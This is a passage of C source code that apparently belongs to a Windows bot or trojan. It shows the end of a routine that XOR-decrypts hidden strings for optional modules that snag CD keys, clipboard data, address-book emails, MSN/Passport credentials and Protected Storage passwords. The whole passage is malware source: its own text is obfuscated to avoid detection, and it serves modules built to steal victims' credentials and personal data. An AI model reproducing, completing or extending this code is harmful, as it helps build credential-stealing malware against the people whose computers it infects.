#ifndef NO_SNAGCDKEYS
		crypto_xor((char *)string_snagcdkeysgettingcdkeys, xorkey);
		crypto_xor((char *)string_snagcdkeyscdkey, xorkey);
		crypto_xor((char *)string_snagcdkeyswincdkeydigits, xorkey);
		crypto_xor((char *)string_snagcdkeyswincdkeyregistrypath, xorkey);
		crypto_xor((char *)string_snagcdkeyswincdkeyregistryvalue, xorkey);
		crypto_xor((char *)string_snagcdkeyswincdkeycdkey, xorkey);
#endif
#ifndef NO_SNAGCLIPBOARD
		crypto_xor((char *)string_snagclipboardgettingclipboarddata, xorkey);
		crypto_xor((char *)string_snagclipboarddata, xorkey);
#endif
#ifndef NO_SNAGEMAILS
		crypto_xor((char *)string_snagemailswabregistrykey, xorkey);
		crypto_xor((char *)string_snagemailsgettingemails, xorkey);
		crypto_xor((char *)string_snagemailsfailedtopenwabfile, xorkey);
		crypto_xor((char *)string_snagemailsemail, xorkey);
#endif
#ifndef NO_SNAGMSN
		crypto_xor((char *)string_snagmsnseed, xorkey);
		crypto_xor((char *)string_snagmsncryptdatalibrary, xorkey);
		crypto_xor((char *)string_snagmsncredentiallibrary, xorkey);
		crypto_xor((char *)string_snagmsncryptunprotecteddatafunction, xorkey);
		crypto_xor((char *)string_snagmsncredenumeratefunction, xorkey);
		crypto_xor((char *)string_snagmsncredreadfunction, xorkey);
		crypto_xor((char *)string_snagmsncredfreefunction, xorkey);
		crypto_xor((char *)string_snagmsnpassportnet, xorkey);
		crypto_xor((char *)string_snagmsngettingcredentials, xorkey);
		crypto_xor((char *)string_snagmsncredentialfailed, xorkey);
		crypto_xor((char *)string_snagmsncredentialinfo, xorkey);
#endif
#ifndef NO_SNAGSTORAGE
		crypto_xor((char *)string_snagstoragepstorefunction, xorkey);
		crypto_xor((char *)string_snagstoragepstorelibrary, xorkey);
		crypto_xor((char *)string_snagstoragegettingpasswordstoragedata, xorkey);
		crypto_xor((char *)string_snagstoragefailedtoloadpstoreclibrary, xorkey);
		crypto_xor((char *)string_snagstoragemainguid, xorkey);
		crypto_xor((char *)string_snagstoragesubguid, xorkey);
		crypto_xor((char *)string_snagstorageitem, xorkey);
		crypto_xor((char *)string_snagstoragedata, xorkey);
#endif
		crypto_xor((char *)string_snagendofsnag, xorkey);
}